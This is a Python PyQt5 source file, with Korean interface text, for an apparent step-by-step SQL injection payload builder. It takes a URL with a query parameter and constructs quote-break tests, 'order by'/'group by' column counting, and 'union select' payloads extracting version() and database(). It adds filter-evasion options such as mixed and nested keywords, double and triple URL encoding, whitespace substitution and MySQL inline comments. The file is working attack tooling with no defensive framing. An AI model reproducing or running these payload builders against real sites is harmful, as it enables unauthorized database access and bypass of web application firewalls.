import sys
from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from modules import *
import layout

#-------------------------------------------------------------------------------------------------------------------------

def Step0_Next(self):
	if layout.url[0].text().rfind("=") == -1 or layout.url[0].text().rfind("?") == -1:
		Error("Error", "취약점이 있는 페이지를 찾아주세요.")
	else:
		layout.wrap[0].hide()
		layout.wrap[1].show()
		text = layout.url[0].text()
		sliced = text[-10 : layout.url[0].text().rfind("=") + 1]
		numberSetText = layout.step1_number.setItemText

		numberSetText(0, sliced + text[layout.url[0].text().rfind("=") + 1 : len(layout.url[0].text())])
		numberSetText(1, sliced + "99999")
		numberSetText(2, sliced + "null")

		layout.url[1].setText(layout.url[0].text() + "'")

#------------------------------------------------------------------------------------------------------------------------

def Step1_SetNumber():
	defaultUrl = layout.url[0].text()[0 : -10]
	setUrl = layout.url[1].setText
	current = layout.step1_number.currentText()
	colon = layout.setColon.currentText()

	if layout.step1_number.currentIndex() == 0:
		setUrl(defaultUrl + current + colon)
	elif layout.step1_number.currentIndex() == 1:
		setUrl(defaultUrl + current + colon)
	elif layout.step1_number.currentIndex() == 2:
		setUrl(defaultUrl + current + colon)

def Step1_SetColon():
	defaultUrl = layout.url[0].text()[0 : -10]
	setUrl = layout.url[1].setText
	current = layout.step1_number.currentText()
	colon = layout.setColon.currentText()

	if layout.setColon.currentIndex() == 0:
		setUrl(defaultUrl + current + colon)
	elif layout.setColon.currentIndex() == 1:
		setUrl(defaultUrl + current + colon)
	elif layout.setColon.currentIndex() == 2:
		setUrl(defaultUrl + current + colon)

def Step1_SettingColon():
	if layout.setAscii[1].currentIndex() == 0:
		layout.setColon.setItemText(0, "'")
		layout.setColon.setItemText(1, '"')
		layout.setColon.setItemText(2, ")")
		Step1_SetColon()
	elif layout.setAscii[1].currentIndex() == 1:
		layout.setColon.setItemText(0, DoubleAscii("'"))
		layout.setColon.setItemText(1, DoubleAscii('"'))
		layout.setColon.setItemText(2, DoubleAscii(")"))
		Step1_SetColon()
	elif layout.setAscii[1].currentIndex() == 2:
		layout.setColon.setItemText(0, TripleAscii("'"))
		layout.setColon.setItemText(1, TripleAscii('"'))
		layout.setColon.setItemText(2, TripleAscii(")"))
		Step1_SetColon()

def Step1_Prev():
	layout.wrap[1].hide()
	layout.wrap[0].show()

def Step1_Next():
	layout.wrap[1].hide()
	layout.confirm_step1_wrap.show()

def Step1_Confirm_Prev():
	layout.confirm_step1_wrap.hide()
	layout.wrap[1].show()

def Step1_Confirm_Next():
	for i in range(0, len(layout.confirm_step1_radioButton)):
		if layout.confirm_step1_radioButton[i].isChecked() == True:
			layout.confirm_step1_wrap.hide()
			layout.wrap[2].show()
			layout.url[2].setText(layout.url[1].text() + layout.order_by.currentText() + layout.lastComment.currentText())
			break
		elif i == len(layout.confirm_step1_radioButton) - 1 and layout.confirm_step1_radioButton[i].isChecked() == False:
			Error("에러", "선택된 것이 없습니다.")

#------------------------------------------------------------------------------------------------------------------------------

def Step2_SetOrderBy():
	defaultUrl = layout.url[1].text()
	setUrl = layout.url[2].setText
	current = layout.order_by.currentText()
	comment = layout.lastComment.currentText()
	amount = layout.column_amount.text()

	if layout.column_amount.text() != "" and layout.column_amount.text().isdigit() == False:
		Error("에러", "숫자만 입력해주세요")
		layout.column_amount.setText("")
	else :
		setUrl(defaultUrl + current + amount + comment)

def Step2_SettingOrderBy():
	settext = layout.order_by.setItemText
	text0 = layout.order_by.itemText(0)
	text1 = layout.order_by.itemText(1)
	orderby = " order by "
	groupby = " group by "

	if layout.alphabetCase[2].currentIndex() == 0:
		settext(0, orderby)
		settext(1, groupby)
	elif layout.alphabetCase[2].currentIndex() == 1:
		orderby = orderby.upper()
		groupby = groupby.upper()
		settext(0, orderby)
		settext(1, groupby)
	elif layout.alphabetCase[2].currentIndex() == 2:
		orderby = RandomCase(orderby)
		groupby = RandomCase(groupby)
		settext(0, orderby)
		settext(1, groupby)
	elif layout.alphabetCase[2].currentIndex() == 3:
		orderby = " ORorderDER BbyY "
		groupby = " GRgroupOUP BbyY "
		settext(0, orderby)
		settext(1, groupby)

	if layout.setAscii[2].currentIndex() == 0:
		settext(0, orderby)
		settext(1, groupby)
	elif layout.setAscii[2].currentIndex() == 1:
		orderby = " " + DoubleAscii(orderby[1]) + orderby[2 : orderby.find(" ", 1) + 1] + DoubleAscii(orderby[orderby.find(" ", 1) + 1]) + orderby[orderby.find(" ", 1) + 2 : len(orderby)]
		groupby = " " + DoubleAscii(groupby[1]) + groupby[2 : groupby.find(" ", 1) + 1] + DoubleAscii(groupby[groupby.find(" ", 1) + 1]) + groupby[groupby.find(" ", 1) + 2 : len(groupby)]
		settext(0, orderby)
		settext(1, groupby)
	elif layout.setAscii[2].currentIndex() == 2:
		orderby = " " + TripleAscii(orderby[1]) + orderby[2 : orderby.find(" ", 1) + 1] + TripleAscii(orderby[orderby.find(" ", 1) + 1]) + orderby[orderby.find(" ", 1) + 2 : len(orderby)]
		groupby = " " + TripleAscii(groupby[1]) + groupby[2 : groupby.find(" ", 1) + 1] + TripleAscii(groupby[groupby.find(" ", 1) + 1]) + groupby[groupby.find(" ", 1) + 2 : len(groupby)]
		settext(0, orderby)
		settext(1, groupby)
	elif layout.setAscii[2].currentIndex() == 3:
		orderby = DoubleAscii(orderby).replace("%2520", " ")
		groupby = DoubleAscii(groupby).replace("%2520", " ")
		settext(0, orderby)
		settext(1, groupby)
	elif layout.setAscii[2].currentIndex() == 4:
		orderby = TripleAscii(orderby).replace("%2520", " ")
		groupby = TripleAscii(groupby).replace("%2520", " ")
		settext(0, orderby)
		settext(1, groupby)

	if layout.whiteSpace[2].currentIndex() == 0:
		settext(0, orderby)
		settext(1, groupby)
	elif layout.whiteSpace[2].currentIndex() == 1:
		orderby = orderby.replace(" ", WhiteSpace())
		groupby = groupby.replace(" ", WhiteSpace())
		settext(0, orderby)
		settext(1, groupby)
	elif layout.whiteSpace[2].currentIndex() == 2:
		orderby = orderby.replace(" ", WhiteSpaceDouble())
		groupby = groupby.replace(" ", WhiteSpaceDouble())
		settext(0, orderby)
		settext(1, groupby)

	if layout.comment[2].currentIndex() == 0:
		settext(0, orderby)
		settext(1, groupby)
	elif layout.comment[2].currentIndex() == 1:
		orderby = " /*!" + orderby[1 : orderby.find(" ", 1)] + "*/ /*!" + orderby[orderby.find(" ", 1) + 1 : len(orderby) - 1] + "*/ "
		groupby = " /*!" + groupby[1 : groupby.find(" ", 1)] + "*/ /*!" + groupby[groupby.find(" ", 1) + 1 : len(groupby) - 1] + "*/ "
		settext(0, orderby)
		settext(1, groupby)

	Step2_SetOrderBy()

def Step2_Prev():
	layout.wrap[2].hide()
	layout.wrap[1].show()

def Step2_Next():
	if layout.column_amount.text() != "":
		layout.wrap[2].hide()
		layout.wrap[3].show()

		url = layout.url[1].text()
		union = " union select "
		comment = layout.lastComment.currentText()
		amount = int(layout.column_amount.text())
		number = []
		scratch = []
		null = []
		for i in range(0, amount):
			number.append(i + 1)
			scratch.append(str(i + 1) * 4)
			null.append("null")

		amount = str(number)
		amount = amount[1 : -1].replace(" ", "")

		scratch = str(scratch)
		scratch = scratch[1 : -1].replace(" ", "").replace("'", "")

		null = str(null)
		null = null[1 : -1].replace(" ", "").replace("'", "")

		layout.url[3].setText(url + union + amount + comment)

		layout.number.setItemText(0, amount)
		layout.number.setItemText(1, null)
		layout.number.setItemText(2, scratch)

	else:
		Error("에러", "숫자가 입력되지 않았습니다.")

#-------------------------------------------------------------------------------------

def Step3_SetUrl():
	errorFactor = ""
	if layout.error_factor.currentIndex() == 0:
		errorFactor = ""
	elif layout.error_factor.currentIndex() == 1:
		errorFactor = "-"

	url = layout.url[1].text()[0 : layout.url[1].text().rfind("=") + 1]
	url_ = layout.url[1].text()[layout.url[1].text().rfind("=") + 1 : len(layout.url[1].text())]
	union = layout.union_select.currentText()
	number = layout.number.currentText()
	comment = layout.lastComment.currentText()

	layout.url[3].setText(url + errorFactor + url_ + union + number + comment)


def Step3_SetUnion():
	union = " union select "
	union_ = " union all select "
	settext = layout.union_select.setItemText
	if layout.alphabetCase[3].currentIndex() == 0:
		settext(0, union)
		settext(1, union_)
	elif layout.alphabetCase[3].currentIndex() == 1:
		union = union.upper()
		union_ = union_.upper()
		settext(0, union)
		settext(1, union_)
	elif layout.alphabetCase[3].currentIndex() == 2:
		union = RandomCase(union)
		union_ = RandomCase(union_)
		settext(0, union)
		settext(1, union_)
	elif layout.alphabetCase[3].currentIndex() == 3:
		union = " UNunionION SELselectECT "
		union_ = " UNunionION AallLL SELselectECT "
		settext(0, union)
		settext(1, union_)

	if layout.setAscii[3].currentIndex() == 0:
		settext(0, union)
		settext(1, union_)
	elif layout.setAscii[3].currentIndex() == 1:
		ascii_u = DoubleAscii(union[1])
		nion = union[2 : union.find(" ", 1) + 1]
		ascii_s = DoubleAscii(union[union.find(" ", 1) + 1])
		elect = union[union.find(" ", 1) + 2 : len(union)]

		ascii_u_ = DoubleAscii(union_[1])
		nion_ = union_[2 : union_.find(" ", 1) + 1]
		ascii_a_ = DoubleAscii(union_[union_.find(" ", 1) + 1])
		ll_ = union_[union_.find(" ", 1) + 2 : union_.find(" ", union_.find(" ", 1) + 1) + 1]
		ascii_s_ = DoubleAscii(union_[union_.find(" ", union_.find(" ", 1) + 1) + 1])
		elect_ = union_[union_.find(" ", union_.find(" ", 1) + 1) + 2 : len(union_)]

		union = " " + ascii_u + nion + ascii_s + elect
		union_ = " " + ascii_u_ + nion_ + ascii_a_ + ll_ + ascii_s_ + elect_
		settext(0, union)
		settext(1, union_)
	elif layout.setAscii[3].currentIndex() == 2:
		ascii_u = TripleAscii(union[1])
		nion = union[2 : union.find(" ", 1) + 1]
		ascii_s = TripleAscii(union[union.find(" ", 1) + 1])
		elect = union[union.find(" ", 1) + 2 : len(union)]

		ascii_u_ = TripleAscii(union_[1])
		nion_ = union_[2 : union_.find(" ", 1) + 1]
		ascii_a_ = TripleAscii(union_[union_.find(" ", 1) + 1])
		ll_ = union_[union_.find(" ", 1) + 2 : union_.find(" ", union_.find(" ", 1) + 1) + 1]
		ascii_s_ = TripleAscii(union_[union_.find(" ", union_.find(" ", 1) + 1) + 1])
		elect_ = union_[union_.find(" ", union_.find(" ", 1) + 1) + 1 : len(union_)]

		union = " " + ascii_u + nion + ascii_s + elect
		union_ = " " + ascii_u_ + nion_ + ascii_a_ + ll_ + ascii_s_ + elect_
		settext(0, union)
		settext(1, union_)
	elif layout.setAscii[3].currentIndex() == 3:
		union = DoubleAscii(union).replace("%2520", " ")
		union_ = DoubleAscii(union_).replace("%2520", " ")
		settext(0, union)
		settext(1, union_)
	elif layout.setAscii[3].currentIndex() == 4:
		union = TripleAscii(union).replace("%252520", " ")
		union_ = TripleAscii(union_).replace("%252520", " ")
		settext(0, union)
		settext(1, union_)

	if layout.whiteSpace[3].currentIndex() == 0:
		settext(0, union)
		settext(1, union_)
	elif layout.whiteSpace[3].currentIndex() == 1:
		union = union.replace(" ", WhiteSpace())
		union_ = union_.replace(" ", WhiteSpace())
		settext(0, union)
		settext(1, union_)
	elif layout.whiteSpace[3].currentIndex() == 2:
		union = union.replace(" ", WhiteSpaceDouble())
		union_ = union_.replace(" ", WhiteSpaceDouble())
		settext(0, union)
		settext(1, union_)

	if layout.comment[3].currentIndex() == 0:
		settext(0, union)
		settext(1, union_)
	elif layout.comment[3].currentIndex() == 1:
		sliced_union = union[1 : union.find(" ", 1)]
		sliced_select = union[union.find(" ", 1) + 1 : union.find(" ", union.find(" ", 1) + 1)]
		union = " /*!" + sliced_union + "*/ /*!" + sliced_select + "*/ "

		sliced_union_ = union_[1: union_.find(" ", 1)]
		sliced_all_ = union_[union_.find(" ", 1) + 1 : union_.find(" ", union_.find(" ", 1) + 1)]
		sliced_select_ = union_[union_.find(" ", union_.find(" ", 1) + 1) + 1 : union_.find(" ", union_.find(" ", union_.find(" ", 1) + 1) + 1)]
		union_ = " /*!" + sliced_union_ + "*/ /*!" + sliced_all_ + "*/ /*!" + sliced_select_ + "*/ "

		settext(0, union)
		settext(1, union_)

	Step3_SetUrl()


def Step3_Prev():
	layout.wrap[3].hide()
	layout.wrap[2].show()

def Step3_Next():
	layout.wrap[3].hide()
	layout.confirm_step3_wrap.show()

#-----------------------------------------------------------------------------------------------------------------------------


def Step3_Confirm_Input():
	if layout.confirm_step3_input.text() != "" and layout.confirm_step3_input.text().isdigit() == False:
		Error("에러", "숫자만 입력해주세요")
		layout.confirm_step3_input.setText("")

def Step3_Confirm_Prev():
	layout.wrap[3].show()
	layout.confirm_step3_wrap.hide()

def OverStep3(entity, what):
	url = layout.url[1].text()[0 : layout.url[1].text().rfind("=") + 1]
	url_ = layout.url[1].text()[layout.url[1].text().rfind("=") + 1 : len(layout.url[1].text())]
	union = layout.union_select.currentText()
	comment = layout.lastComment.currentText()
	errorFactor = ""
	if layout.error_factor.currentIndex() == 1:
		errorFactor = "-"

	num = int(layout.confirm_step3_input.text())
	amount = int(layout.column_amount.text())
	number = []

	for i in range(0, amount):
		if layout.number.currentIndex() == 0:
			if i == num - 1:
				number.append(what)
			else:
				number.append(i + 1)
		elif layout.number.currentIndex() == 1:
			if i == num - 1:
				number.append(what)
			else:
				number.append("null")
		elif layout.number.currentIndex() == 1:
			if i == num - 1:
				number.append(what)
			else:
				number.append(str(i) * 4)

	number = str(number)
	number = number[1 : -1].replace(" ", "").replace("'", "")

	entity.setText(url + errorFactor + url_ + union + number + comment)


def Step3_Confirm_Next():
	if layout.confirm_step3_input.text() == "":
		Error("에러", "숫자가 입력되지 않았습니다.")
	else:
		layout.wrap[4].show()
		layout.confirm_step3_wrap.hide()

		OverStep3(layout.url[4], "version()")


#------------------------------------------------------------------------------------------------------------------------------



def Step4_SetUrl():
	version = "version()"
	version_ = "@@version()"

	settext = layout.version.setItemText

	if layout.alphabetCase[4].currentIndex() == 0:
		version = version.lower()
		version_ = version_.lower()
		settext(0, version)
		settext(1, version_)
	elif layout.alphabetCase[4].currentIndex() == 1:
		version = version.upper()
		version_ = version_.upper()
		settext(0, version)
		settext(1, version_)
	elif layout.alphabetCase[4].currentIndex() == 2:
		version = RandomCase(version)
		version_ = RandomCase(version_)
		settext(0, version)
		settext(1, version_)

	if layout.setAscii[4].currentIndex() == 0:
		version = version
		version_ = version_
		settext(0, version)
		settext(1, version_)
	elif layout.setAscii[4].currentIndex() == 1:
		version = DoubleAscii(version[0]) + version[1 : len(version)]
		version_ = DoubleAscii(version_[0]) + version_[1 : len(version_)]
		settext(0, version)
		settext(1, version_)
	elif layout.setAscii[4].currentIndex() == 2:
		version = TripleAscii(version[0]) + version[1 : len(version)]
		version_ = TripleAscii(version_[0]) + version_[1 : len(version_)]
		settext(0, version)
		settext(1, version_)
	elif layout.setAscii[4].currentIndex() == 3:
		version = DoubleAscii(version)
		version_ = DoubleAscii(version_)
		settext(0, version)
		settext(1, version_)
	elif layout.setAscii[4].currentIndex() == 4:
		version = TripleAscii(version)
		version_ = TripleAscii(version_)
		settext(0, version)
		settext(1, version_)

	if layout.comment[4].currentIndex() == 0:
		version = version
		version_ = version_
		settext(0, version)
		settext(1, version_)
	elif layout.comment[4].currentIndex() == 1:
		version = "/*!" + version + "*/"
		version_ = "/*!" + version_ + "*/"
		settext(0, version)
		settext(1, version_)

	OverStep3(layout.url[4], layout.version.currentText())


def Step4_Prev():
	layout.wrap[4].hide()
	layout.wrap[3].show()

def Step4_Next():
	layout.wrap[4].hide()
	layout.confirm_step4_wrap.show()

def Step4_Confirm_Prev():
	layout.wrap[4].show()
	layout.confirm_step4_wrap.hide()

def Step4_Confirm_Next():
	layout.confirm_step4_wrap.hide()
	layout.wrap[5].show()

	OverStep3(layout.url[5], "database()")
